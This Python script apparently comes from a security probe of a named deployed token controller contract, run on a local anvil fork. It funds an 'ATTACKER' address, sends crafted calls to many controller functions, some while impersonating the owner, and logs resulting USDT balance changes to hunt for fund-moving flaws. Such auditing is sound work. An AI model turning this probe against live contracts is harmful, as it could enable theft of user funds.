#!/usr/bin/env python3
"""Probe the SKYDAO controller (0xEe5fDff6...) on a LOCAL anvil fork only.

Read-only w.r.t. mainnet: all state changes happen in the local anvil fork.
No keys. No mainnet transactions.
"""
import json, urllib.request, sys

RPC = 'http://127.0.0.1:8545'
CTRL = '0xEe5fDff6364dDe0A3C66dD38A4303cDd3D10730c'
USDT = '0x55d398326f99059fF775485246999027B3197955'
TOKEN = '0x7eBa33c7a0e555D115277BA4Af04DFbB4F4Fa70c'
CFG = '0x85870c50677c142f5e37930915d8984cce7623e1'
OWNER = '0x6390ef00953dd0e0c5b15c50b28da36c2944d5d9'
CFG20 = '0xffa467ebb29be842b0898e7dccbb1a70a9cf2672'
ATTACKER = '0x1111111111111111111111111111111111111111'
RECIPIENTS = [
    '0x096e08ddA1E18625fFdfBae4BB65a414Aa7eC2c8',  # pair (results[16])
    '0x8e97f47963806306bff8b2caabcbfefab1923397',  # results[6]
    '0x34d36a5cf68042ae64be6033aee3dd34b5257219',  # results[14]
    '0x6c526c40a779c42233c1268b41a269621da07e46',  # results[19]
    '0x9f9785aaf02157b465ab60420514bce0dc033391',  # results[4]
    '0xdebb963f450718a7d1933c73aff605f27a990c02',  # results[21]
]

def rpc(method, params):
    req = urllib.request.Request(RPC, data=json.dumps({'jsonrpc':'2.0','id':1,'method':method,'params':params}).encode(),
                                 headers={'Content-Type':'application/json'})
    with urllib.request.urlopen(req, timeout=30) as r:
        d = json.load(r)
    if 'error' in d:
        raise RuntimeError(d['error'])
    return d.get('result')

def usdt(addr):
    r = rpc('eth_call', [{'to':USDT,'data':'0x70a08231'+'0'*24+addr[2:].lower()}, 'latest'])
    return int(r,16)

def sky(addr):
    r = rpc('eth_call', [{'to':TOKEN,'data':'0x70a08231'+'0'*24+addr[2:].lower()}, 'latest'])
    return int(r,16)

def send(frm, to, data, gas=8_000_000):
    tx = {'from':frm.lower(), 'to':to.lower(), 'data':data, 'gas':hex(gas), 'gasPrice':hex(10**9)}
    return rpc('eth_sendTransaction', [tx])

def call(frm, to, data, gas=8_000_000):
    try:
        r = rpc('eth_call', [{'from':frm.lower(), 'to':to.lower(), 'data':data, 'gas':hex(gas)}, 'latest'])
        return ('OK', r)
    except RuntimeError as e:
        return ('REVERT', str(e)[:180])

def snapshot():
    return {a: usdt(a) for a in [ATTACKER, CTRL] + RECIPIENTS}

def diff(s0):
    out = []
    for a,v in snapshot().items():
        d = v - s0[a]
        if d: out.append((a, d))
    return out

def main():
    rpc('anvil_setBalance', [ATTACKER, hex(200*10**18)])
    s0 = snapshot()
    c0 = usdt(CTRL)
    print(f"[init] controller USDT = {c0/1e18:.6f}")

    # candidate function calls: (label, to, data, caller)
    def enc_u(v): return f'{v:064x}'
    def enc_a(a): return '0'*24 + a[2:].lower()
    A = ATTACKER; small = 10**18
    probes = [
        # public non-owner functions, from attacker
        ('0e35201b(A,0)',      CTRL, '0x0e35201b'+enc_a(A)+enc_u(0), A),
        ('0e35201b(A,1e18)',   CTRL, '0x0e35201b'+enc_a(A)+enc_u(small), A),
        ('2c4e3db0(1,A)',      CTRL, '0x2c4e3db0'+enc_u(1)+enc_a(A), A),
        ('2c4e3db0(0,A)',      CTRL, '0x2c4e3db0'+enc_u(0)+enc_a(A), A),
        ('6f016bc8(A)',        CTRL, '0x6f016bc8'+enc_a(A), A),
        ('df526413(A)',        CTRL, '0xdf526413'+enc_a(A), A),
        ('b110544f(A)',        CTRL, '0xb110544f'+enc_a(A), A),
        ('ec715a31()',         CTRL, '0xec715a31', A),
        # owner-gated
        ('fa302aec(1,A)',      CTRL, '0xfa302aec'+enc_u(1)+enc_a(A), OWNER),
        ('fa302aec(2,A)',      CTRL, '0xfa302aec'+enc_u(2)+enc_a(A), OWNER),
        ('f4c6aa92(A,0)',      CTRL, '0xf4c6aa92'+enc_a(A)+enc_u(0), OWNER),
        ('53fe7d7e(0,1)',      CTRL, '0x53fe7d7e'+enc_u(0)+enc_u(1), OWNER),
        ('87d8d643()',         CTRL, '0x87d8d643', OWNER),
        ('87d8d643()',         CTRL, '0x87d8d643', A),
        # release callers
        ('ec715a31(cfg20)',    CTRL, '0xec715a31', CFG20),
        # register from token
        ('register(A,1e18)',   CTRL, '0x6d705ebb'+enc_a(A)+enc_u(small), TOKEN),
        # sellToken from token (controller has ~0 SKYDAO; expect revert inside swap)
        ('sellToken(1e18,0)',  CTRL, '0x473a9ad9'+enc_u(small)+enc_u(0), TOKEN),
        ('sellToken(1e18,1)',  CTRL, '0x473a9ad9'+enc_u(small)+enc_u(1), TOKEN),
    ]
    results = []
    for label, to, data, frm in probes:
        st, res = call(frm, to, data)
        sent = None; dd = None
        if st == 'OK':
            try:
                send(frm, to, data)
                dd = diff(s0)
                s0 = snapshot()
            except RuntimeError as e:
                sent = f'callOK-sendFail {str(e)[:100]}'
        results.append({'probe':label,'caller':frm,'call':st,'res':str(res)[:140],'send_err':sent,'balance_diffs':dd})
        print(f"== {label} from {frm[:10]}.. -> {st} {str(res)[:80]}")
        if sent: print("   send:", sent)
        if dd is not None:
            for a,d in dd: print(f"   DIFF {a} {d/1e18:+.6f}")
    json.dump(results, open('raw/probe_controller_results.json','w'), indent=1)

if __name__ == '__main__':
    main()
